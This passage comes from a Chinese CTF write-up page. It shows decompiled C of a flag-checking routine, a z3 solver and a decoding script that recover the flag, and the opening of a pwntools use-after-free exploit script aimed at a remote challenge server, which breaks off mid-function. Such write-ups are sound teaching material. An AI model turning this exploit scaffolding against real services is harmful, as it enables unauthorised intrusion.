class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_4051A0</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  _DWORD *v1; <span class="hljs-comment">// r10</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// rbp</span><br>  _DWORD *v3; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// r8</span><br>  <span class="hljs-type">char</span> *v5; <span class="hljs-comment">// r9</span><br>  <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// rcx</span><br>  _DWORD *v7; <span class="hljs-comment">// rax</span><br>  __int64 v8; <span class="hljs-comment">// rsi</span><br>  __int64 v9; <span class="hljs-comment">// rdx</span><br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v11[<span class="hljs-number">400</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-348h] BYREF</span><br>  <span class="hljs-type">char</span> v12[<span class="hljs-number">400</span>]; <span class="hljs-comment">// [rsp+190h] [rbp-1B8h] BYREF</span><br>  <span class="hljs-type">char</span> v13; <span class="hljs-comment">// [rsp+320h] [rbp-28h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v14; <span class="hljs-comment">// [rsp+328h] [rbp-20h]</span><br><br>  v1 = a1;<br>  v2 = v12;<br>  v14 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  qmemcpy(v11, &amp;unk_574020, <span class="hljs-keyword">sizeof</span>(v11));<br>  qmemcpy(v12, &amp;unk_5741C0, <span class="hljs-keyword">sizeof</span>(v12));<br>  v3 = a1 + <span class="hljs-number">10</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )<br>  &#123;<br>    v4 = v11;<br>    v5 = v2;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      v6 = v4;<br>      v7 = v1;<br>      LODWORD(v8) = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v9 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(*(_DWORD *)v6 * *v7++);<br>        v6 += <span class="hljs-number">40</span>;<br>        v8 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(v9 + v8);<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v7 != v3 );<br>      <span class="hljs-keyword">if</span> ( *(_DWORD *)v5 != (_DWORD)v8 )<br>      &#123;<br>        result = <span class="hljs-number">0LL</span>;<br>        <span class="hljs-keyword">goto</span> LABEL_10;<br>      &#125;<br>      v4 += <span class="hljs-number">4</span>;<br>      v5 += <span class="hljs-number">4</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v4 != &amp;v11[<span class="hljs-number">40</span>] );<br>    v2 += <span class="hljs-number">40</span>;<br>    v1 += <span class="hljs-number">10</span>;<br>    v3 = v7 + <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> ( v2 != &amp;v13 )<br>      <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">break</span>;<br>  &#125;<br>  result = <span class="hljs-number">1LL</span>;<br>LABEL_10:<br>  <span class="hljs-keyword">if</span> ( __readfsqword(<span class="hljs-number">0x28</span>u) != v14 )<br>    sub_52D790(v3, v8, v9, v6, v4, v5);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>每10个字符要循环加密10次，进行相乘。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#n = 0，10，20，30，40，50，60，70，80，90</span><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span>*<br>s=Solver()<br>flag = [Int(<span class="hljs-string">&quot;flag%d&quot;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>)]<br>a = [<span class="hljs-number">0x0001C633</span>, <span class="hljs-number">0x0001DF94</span>, <span class="hljs-number">0x00020EBF</span>, <span class="hljs-number">0x0002BA40</span>, <span class="hljs-number">0x0001E884</span>, <span class="hljs-number">0x000260D1</span>, <span class="hljs-number">0x0001F9B1</span>, <span class="hljs-number">0x0001EA1A</span>, <span class="hljs-number">0x0001EEAA</span>, <span class="hljs-number">0x0001DFB2</span>, <span class="hljs-number">0x0001C1D0</span>, <span class="hljs-number">0x0001EEF2</span>, <span class="hljs-number">0x000216E1</span>, <span class="hljs-number">0x0002BE00</span>, <span class="hljs-number">0x0001FB5E</span>, <span class="hljs-number">0x00025D74</span>, <span class="hljs-number">0x0001F000</span>, <span class="hljs-number">0x000202D6</span>, <span class="hljs-number">0x00020002</span>, <span class="hljs-number">0x0001DDFE</span>, <span class="hljs-number">0x0001C017</span>, <span class="hljs-number">0x0001F08C</span>, <span class="hljs-number">0x000227F6</span>, <span class="hljs-number">0x0002C7BA</span>, <span class="hljs-number">0x000201AE</span>, <span class="hljs-number">0x00027FBF</span>, <span class="hljs-number">0x00020E21</span>, <span class="hljs-number">0x0001FF5C</span>, <span class="hljs-number">0x0001FD62</span>, <span class="hljs-number">0x0001E948</span>, <span class="hljs-number">0x0001BE6E</span>, <span class="hljs-number">0x0001F4D7</span>, <span class="hljs-number">0x00022C8D</span>, <span class="hljs-number">0x0002C353</span>, <span class="hljs-number">0x0001F8DB</span>, <span class="hljs-number">0x00026E1D</span>, <span class="hljs-number">0x0001FF61</span>, <span class="hljs-number">0x0001EA0F</span>, <span class="hljs-number">0x0001F0D6</span>, <span class="hljs-number">0x0001EDA8</span>, <span class="hljs-number">0x0001AD7D</span>, <span class="hljs-number">0x00018218</span>, <span class="hljs-number">0x0001CCD4</span>, <span class="hljs-number">0x000239B6</span>, <span class="hljs-number">0x0001AC4C</span>, <span class="hljs-number">0x00020D7C</span>, <span class="hljs-number">0x0001D967</span>, <span class="hljs-number">0x0001A4F4</span>, <span class="hljs-number">0x0001CAD8</span>, <span class="hljs-number">0x000196AE</span>, <span class="hljs-number">0x0001831B</span>, <span class="hljs-number">0x00017E45</span>, <span class="hljs-number">0x0001D0CF</span>, <span class="hljs-number">0x00023EDF</span>, <span class="hljs-number">0x000181AE</span>, <span class="hljs-number">0x00021760</span>, <span class="hljs-number">0x0001D3B4</span>, <span class="hljs-number">0x000175D6</span>, <span class="hljs-number">0x00017D3A</span>, <span class="hljs-number">0x0001994F</span>, <span class="hljs-number">0x0001189D</span>, <span class="hljs-number">0x00014CCF</span>, <span class="hljs-number">0x0001568E</span>, <span class="hljs-number">0x00017EEB</span>, <span class="hljs-number">0x0001327E</span>, <span class="hljs-number">0x00016A45</span>, <span class="hljs-number">0x00012921</span>, <span class="hljs-number">0x00011FF0</span>, <span class="hljs-number">0x00013643</span>, <span class="hljs-number">0x00011729</span>, <span class="hljs-number">0x00015191</span>, <span class="hljs-number">0x00017D17</span>, <span class="hljs-number">0x00017262</span>, <span class="hljs-number">0x0001A863</span>, <span class="hljs-number">0x00017010</span>, <span class="hljs-number">0x00017B10</span>, <span class="hljs-number">0x00014F9C</span>, <span class="hljs-number">0x000143E8</span>, <span class="hljs-number">0x00015E9B</span>, <span class="hljs-number">0x0001242C</span>, <span class="hljs-number">0x0000F68C</span>, <span class="hljs-number">0x0001192A</span>, <span class="hljs-number">0x000150AD</span>, <span class="hljs-number">0x0001B1A0</span>, <span class="hljs-number">0x00014C60</span>, <span class="hljs-number">0x000182AB</span>, <span class="hljs-number">0x00013F4B</span>, <span class="hljs-number">0x000141A6</span>, <span class="hljs-number">0x00015AA3</span>, <span class="hljs-number">0x000135C9</span>, <span class="hljs-number">0x0001D86F</span>, <span class="hljs-number">0x0001E8FA</span>, <span class="hljs-number">0x0002158D</span>, <span class="hljs-number">0x0002BDAC</span>, <span class="hljs-number">0x00020E4F</span>, <span class="hljs-number">0x00027EE6</span>, <span class="hljs-number">0x000213B9</span>, <span class="hljs-number">0x00020E86</span>, <span class="hljs-number">0x000211FF</span>, <span class="hljs-number">0x0001E1EF</span>]<br>cheng = [<span class="hljs-number">0x000000FE</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x0000001D</span>, <span class="hljs-number">0x000000F6</span>, <span class="hljs-number">0x00000083</span>, <span class="hljs-number">0x000000FF</span>, <span class="hljs-number">0x000000E0</span>, <span class="hljs-number">0x000000B8</span>, <span class="hljs-number">0x000000DD</span>, <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x000000C5</span>, <span class="hljs-number">0x000000DE</span>, <span class="hljs-number">0x000000F6</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x0000009F</span>, <span class="hljs-number">0x000000DD</span>, <span class="hljs-number">0x000000D9</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x0000006B</span>, <span class="hljs-number">0x00000019</span>, <span class="hljs-number">0x000000CA</span>, <span class="hljs-number">0x00000073</span>, <span class="hljs-number">0x000000FD</span>, <span class="hljs-number">0x00000087</span>, <span class="hljs-number">0x00000072</span>, <span class="hljs-number">0x00000024</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000049</span>, <span class="hljs-number">0x0000007E</span>, <span class="hljs-number">0x000000A9</span>, <span class="hljs-number">0x000000CE</span>, <span class="hljs-number">0x00000091</span>, <span class="hljs-number">0x000000BE</span>, <span class="hljs-number">0x00000041</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x00000060</span>, <span class="hljs-number">0x0000003F</span>, <span class="hljs-number">0x0000002B</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x000000D2</span>, <span class="hljs-number">0x00000090</span>, <span class="hljs-number">0x000000E9</span>, <span class="hljs-number">0x0000008E</span>, <span class="hljs-number">0x000000BA</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0x000000F3</span>, <span class="hljs-number">0x00000041</span>, <span class="hljs-number">0x000000AD</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000069</span>, <span class="hljs-number">0x000000DA</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x000000FD</span>, <span class="hljs-number">0x000000FD</span>, <span class="hljs-number">0x000000E7</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x000000D6</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000059</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x000000CC</span>, <span class="hljs-number">0x00000050</span>, <span class="hljs-number">0x00000087</span>, <span class="hljs-number">0x000000AF</span>, <span class="hljs-number">0x000000FB</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x00000044</span>, <span class="hljs-number">0x0000007F</span>, <span class="hljs-number">0x000000AD</span>, <span class="hljs-number">0x000000F8</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x00000067</span>, <span class="hljs-number">0x0000001D</span>, <span class="hljs-number">0x00000022</span>, <span class="hljs-number">0x00000084</span>, <span class="hljs-number">0x000000AC</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000023</span>, <span class="hljs-number">0x000000DC</span>, <span class="hljs-number">0x000000E6</span>, <span class="hljs-number">0x000000BB</span>, <span class="hljs-number">0x000000D2</span>, <span class="hljs-number">0x000000B8</span>, <span class="hljs-number">0x0000004A</span>, <span class="hljs-number">0x000000BC</span>, <span class="hljs-number">0x000000DE</span>, <span class="hljs-number">0x00000050</span>, <span class="hljs-number">0x0000009C</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0x00000086</span>, <span class="hljs-number">0x0000003A</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x000000DD</span>, <span class="hljs-number">0x000000C3</span>, <span class="hljs-number">0x00000003</span>]<br>tr1 = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    i = k<br>    v8 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        v9 = flag[m+n] * cheng[i]<br>        i += <span class="hljs-number">10</span><br>        v8 += v9<br>    s.add(a[k+n] == v8)<br>        <br><br><br><br><span class="hljs-keyword">if</span> s.check() == sat:<br>    m = s.model()<br>    <span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python">flag=[<span class="hljs-number">0</span>]*<span class="hljs-number">100</span><br>flag[<span class="hljs-number">5</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">6</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">0</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">9</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">2</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">7</span>]=<span class="hljs-number">114</span><br>flag[<span class="hljs-number">8</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">1</span>]=<span class="hljs-number">104</span><br>flag[<span class="hljs-number">3</span>]=<span class="hljs-number">114</span><br>flag[<span class="hljs-number">4</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">15</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">11</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">14</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">19</span>]=<span class="hljs-number">108</span><br>flag[<span class="hljs-number">17</span>]=<span class="hljs-number">115</span><br>flag[<span class="hljs-number">18</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">16</span>]=<span class="hljs-number">117</span><br>flag[<span class="hljs-number">10</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">13</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">12</span>]=<span class="hljs-number">108</span><br>flag[<span class="hljs-number">20</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">27</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">25</span>]=<span class="hljs-number">110</span><br>flag[<span class="hljs-number">28</span>]=<span class="hljs-number">114</span><br>flag[<span class="hljs-number">26</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">29</span>]=<span class="hljs-number">109</span><br>flag[<span class="hljs-number">24</span>]=<span class="hljs-number">105</span><br>flag[<span class="hljs-number">21</span>]=<span class="hljs-number">115</span><br>flag[<span class="hljs-number">22</span>]=<span class="hljs-number">115</span><br>flag[<span class="hljs-number">23</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">39</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">34</span>]=<span class="hljs-number">110</span><br>flag[<span class="hljs-number">35</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">33</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">30</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">38</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">31</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">36</span>]=<span class="hljs-number">98</span><br>flag[<span class="hljs-number">32</span>]=<span class="hljs-number">105</span><br>flag[<span class="hljs-number">37</span>]=<span class="hljs-number">117</span><br>flag[<span class="hljs-number">40</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">48</span>]=<span class="hljs-number">108</span><br>flag[<span class="hljs-number">45</span>]=<span class="hljs-number">79</span><br>flag[<span class="hljs-number">43</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">47</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">42</span>]=<span class="hljs-number">46</span><br>flag[<span class="hljs-number">44</span>]=<span class="hljs-number">48</span><br>flag[<span class="hljs-number">46</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">41</span>]=<span class="hljs-number">104</span><br>flag[<span class="hljs-number">49</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">54</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">57</span>]=<span class="hljs-number">99</span><br>flag[<span class="hljs-number">58</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">55</span>]=<span class="hljs-number">99</span><br>flag[<span class="hljs-number">56</span>]=<span class="hljs-number">54</span><br>flag[<span class="hljs-number">59</span>]=<span class="hljs-number">55</span><br>flag[<span class="hljs-number">52</span>]=<span class="hljs-number">56</span><br>flag[<span class="hljs-number">51</span>]=<span class="hljs-number">123</span><br>flag[<span class="hljs-number">50</span>]=<span class="hljs-number">103</span><br>flag[<span class="hljs-number">53</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">66</span>]=<span class="hljs-number">52</span><br>flag[<span class="hljs-number">64</span>]=<span class="hljs-number">50</span><br>flag[<span class="hljs-number">62</span>]=<span class="hljs-number">51</span><br>flag[<span class="hljs-number">68</span>]=<span class="hljs-number">52</span><br>flag[<span class="hljs-number">63</span>]=<span class="hljs-number">54</span><br>flag[<span class="hljs-number">60</span>]=<span class="hljs-number">45</span><br>flag[<span class="hljs-number">65</span>]=<span class="hljs-number">45</span><br>flag[<span class="hljs-number">69</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">61</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">67</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">76</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">78</span>]=<span class="hljs-number">52</span><br>flag[<span class="hljs-number">72</span>]=<span class="hljs-number">99</span><br>flag[<span class="hljs-number">75</span>]=<span class="hljs-number">45</span><br>flag[<span class="hljs-number">73</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">79</span>]=<span class="hljs-number">100</span><br>flag[<span class="hljs-number">74</span>]=<span class="hljs-number">50</span><br>flag[<span class="hljs-number">70</span>]=<span class="hljs-number">45</span><br>flag[<span class="hljs-number">71</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">77</span>]=<span class="hljs-number">51</span><br>flag[<span class="hljs-number">86</span>]=<span class="hljs-number">56</span><br>flag[<span class="hljs-number">83</span>]=<span class="hljs-number">51</span><br>flag[<span class="hljs-number">88</span>]=<span class="hljs-number">125</span><br>flag[<span class="hljs-number">87</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">80</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">84</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">85</span>]=<span class="hljs-number">53</span><br>flag[<span class="hljs-number">82</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">89</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">81</span>]=<span class="hljs-number">48</span><br>flag[<span class="hljs-number">94</span>]=<span class="hljs-number">103</span><br>flag[<span class="hljs-number">95</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">92</span>]=<span class="hljs-number">117</span><br>flag[<span class="hljs-number">91</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">96</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">98</span>]=<span class="hljs-number">105</span><br>flag[<span class="hljs-number">90</span>]=<span class="hljs-number">121</span><br>flag[<span class="hljs-number">93</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">99</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">97</span>]=<span class="hljs-number">95</span><br>flag1 = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    flag1 += <span class="hljs-built_in">chr</span>(flag[i])<br>    <br><span class="hljs-built_in">print</span>(flag1)<br><br><span class="hljs-comment">#there_are_a_lot_useless_information_but_oh.o0O_flag&#123;8f9c6cf7-f362-4a4e-ace2-a34d90939589&#125;_you_get_it</span><br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>banary = <span class="hljs-string">&quot;./main&quot;</span><br>elf = ELF(banary)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>ip = <span class="hljs-string">&#x27;120.78.209.16&#x27;</span><br>port = <span class="hljs-number">48803</span><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local:<br>    io = process(banary)<br><span class="hljs-keyword">else</span>:<br>    io = remote(ip, port)<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><span class="hljs-comment">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(io)<br>    pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : io.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : io.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : io.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : io.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : io.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : io.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(io.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(io.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>iuu32 = <span class="hljs-keyword">lambda</span> : <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br>iuu64 = <span class="hljs-keyword">lambda</span> : <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">6</span>),<span class="hljs-number">16</span>)<br>uheap = <span class="hljs-keyword">lambda</span> : u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> data : io.success(<span class="hljs-string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="hljs-built_in">eval</span>(data)))<br>ia = <span class="hljs-keyword">lambda</span> : io.interactive()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, data = <span class="hljs-string">b&#x27;a&#x27;</span></span>):<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;size: \n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>        sa(<span class="hljs-string">b&#x27;content: \n&#x27;</span>, data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; 